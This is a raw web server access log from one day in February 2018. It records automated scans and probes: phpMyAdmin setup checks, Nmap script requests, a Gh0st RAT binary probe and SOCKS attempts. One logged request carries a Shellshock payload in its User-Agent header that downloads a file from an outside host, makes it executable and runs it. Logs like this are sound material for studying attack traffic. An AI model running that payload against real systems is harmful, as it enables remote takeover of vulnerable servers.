115.198.200.223 - - [06/Feb/2018:01:12:45 +0000] "GET http://www.ip.cn/ HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
63.246.129.99 - - [06/Feb/2018:01:22:52 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
5.188.87.7 - - [06/Feb/2018:03:46:39 +0000] "GET / HTTP/1.0" 200 264 "-" "Mozilla/5.0"
107.170.236.113 - - [06/Feb/2018:04:02:19 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 zgrab/0.x"
196.52.43.115 - - [06/Feb/2018:05:38:42 +0000] "GET / HTTP/1.0" 200 264 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
199.247.9.230 - - [06/Feb/2018:07:23:39 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.247.9.230 - - [06/Feb/2018:07:23:39 +0000] "GET /HNAP1/ HTTP/1.1" 404 143 "http://35.196.196.232/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
66.240.205.34 - - [06/Feb/2018:08:14:39 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 173 "-" "-"
63.246.129.99 - - [06/Feb/2018:10:21:51 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
178.33.133.106 - - [06/Feb/2018:10:26:14 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
178.33.133.106 - - [06/Feb/2018:10:26:40 +0000] "GET / HTTP/1.0" 200 264 "-" "() { :;}; /bin/bash -c \x22curl -o /tmp/log http://mafiagalati.hi2.ro/log;/usr/bin/wget http://mafiagalati.hi2.ro/log -O /tmp/log;wget http://mafiagalati.hi2.ro/log -O /dev/shm/log;chmod +x /dev/shm/log /tmp/log;/dev/shm/log;/tmp/log;rm -rf /dev/shm/log /tmp/log*\x22"
61.240.145.2 - - [06/Feb/2018:11:08:17 +0000] "GET /cgi/online.asp?hostname=[WIN-X6HF63]&httptype=[1][not%20httptunnel] HTTP/1.1" 404 571 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
191.96.249.136 - - [06/Feb/2018:14:30:09 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
46.161.9.57 - - [06/Feb/2018:14:54:01 +0000] "\x04\x01\x00P.\xA1\x099\x00" 400 173 "-" "-"
46.161.9.57 - - [06/Feb/2018:16:06:32 +0000] "\x05\x01\x00" 400 173 "-" "-"
185.222.210.29 - - [06/Feb/2018:17:07:27 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "-"
51.143.153.83 - - [06/Feb/2018:20:32:38 +0000] "CONNECT 51.140.55.230:9001 HTTP/1.0" 400 173 "-" "-"
34.229.17.233 - - [06/Feb/2018:22:06:33 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/50.0.3037.90 Safari/537.32"
130.64.25.62 - - [06/Feb/2018:22:08:08 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
130.64.25.62 - - [06/Feb/2018:22:08:08 +0000] "GET /style.css HTTP/1.1" 200 94 "http://35.196.196.232/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
130.64.25.62 - - [06/Feb/2018:22:08:08 +0000] "GET /sheep.png HTTP/1.1" 200 7564 "http://35.196.196.232/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
130.64.25.62 - - [06/Feb/2018:22:08:08 +0000] "GET /favicon.ico HTTP/1.1" 200 1665 "http://35.196.196.232/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "POST / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /.git/HEAD HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /nmaplowercheck1517954913 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.1" 200 264 "-" "-"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /HNAP1 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "ZCJD / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /favicon.ico HTTP/1.1" 200 1665 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "POST / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "POST /sdk HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET /.git/HEAD HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET /nmaplowercheck1517954997 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "POST / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET / HTTP/1.1" 200 264 "-" "-"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "OMQJ / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET /HNAP1 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET /favicon.ico HTTP/1.1" 200 1665 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:01 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:01 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:01 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:01 +0000] "POST / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:01 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:01 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:01 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:01 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:01 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "GET /nmaplowercheck1517955027 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "GET /.git/HEAD HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "POST / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "POST /sdk HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "GET / HTTP/1.1" 200 264 "-" "-"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "GET /HNAP1 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "OMQJ / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:27 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "POST / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xFFB\xA3\xA7\xD37l\xEAsD\xDD\x01/(N\xD7\x1C\xA9\x91*\xEF6YCDg\xE8\x87z\xFC\x0C\xAF\x00\x00\xDA\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" 400 173 "-" "-"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xBD\xE9\xC4\xEA\x7F1\xDB\x00r;\x084U\x12\xEAA\x03\xC88J\xF0;\xB2\x98Z\x8D;\x1B\xB4\xC2\x95M\x00\x00\xDA\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" 400 173 "-" "-"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.58 - - [06/Feb/2018:22:10:28 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET /nmaplowercheck1517955069 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET /.git/HEAD HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "POST / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "POST /sdk HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET / HTTP/1.1" 200 264 "-" "-"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "OMQJ / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET /HNAP1 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "GET /favicon.ico HTTP/1.1" 200 1665 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:11:12 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
